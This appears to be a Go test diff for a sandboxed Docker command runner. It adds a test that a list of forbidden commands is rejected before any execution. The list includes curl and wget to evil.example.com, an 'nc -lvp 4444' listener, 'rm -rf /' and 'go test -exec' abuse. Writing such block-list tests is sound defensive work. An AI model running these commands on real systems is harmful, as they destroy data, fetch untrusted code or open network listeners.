@@ -5,6 +5,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
@@ -163,9 +164,51 @@ func TestAdversarial_5_ResourceQuotaExhaustionEnforced(t *testing.T) {
 	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
 	defer cancel()
 
-	_, err := runner.RunCommand(ctx, t.TempDir(), "sleep 10")
+	_, err := runner.RunCommand(ctx, t.TempDir(), "go test -timeout 10s")
 	if err == nil {
 		t.Fatalf("expected command with 20ms context timeout to fail, but succeeded")
+	}
+}
+
+// TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands verifies that forbidden commands
+// are rejected at the application policy boundary before container creation, resulting in
+// exactly zero execution attempts.
+func TestCommandPolicy_ZeroExecutionAttemptsOnForbiddenCommands(t *testing.T) {
+	runner := NewDockerContainerRunner()
+	// Mock checker that always succeeds to prove rejection is purely application policy
+	runner.Checker = func(ctx context.Context) error { return nil }
+
+	forbiddenCommands := []string{
+		"sh -c 'echo pwned'",
+		"bash -c 'whoami'",
+		"powershell.exe -Command 'dir'",
+		"cmd.exe /c 'dir'",
+		"python -c 'import os; print(os.environ)'",
+		"curl -s https://evil.example.com",
+		"wget https://evil.example.com",
+		"nc -lvp 4444",
+		"rm -rf /",
+		"go test -exec 'rm -rf /'",
+		"go test -toolexec '/evil/bin'",
+		"go build -plugin",
+		"go get github.com/evil/pkg",
+		"go run main.go",
+	}
+
+	for _, cmdStr := range forbiddenCommands {
+		res, err := runner.RunCommand(context.Background(), t.TempDir(), cmdStr)
+		if err == nil {
+			t.Errorf("Security violation: expected command %q to be rejected, but succeeded with res=%+v", cmdStr, res)
+		}
+		if !strings.Contains(err.Error(), "command policy rejection") && !strings.Contains(err.Error(), "security violation") {
+			t.Errorf("Expected application policy rejection error for %q, got: %v", cmdStr, err)
+		}
+	}
+
+	// Verify ZERO execution attempts occurred
+	attempts := atomic.LoadInt64(&runner.ExecutionAttempts)
+	if attempts != 0 {
+		t.Fatalf("Security failure: expected 0 execution attempts for forbidden commands, got %d", attempts)
 	}
 }
 
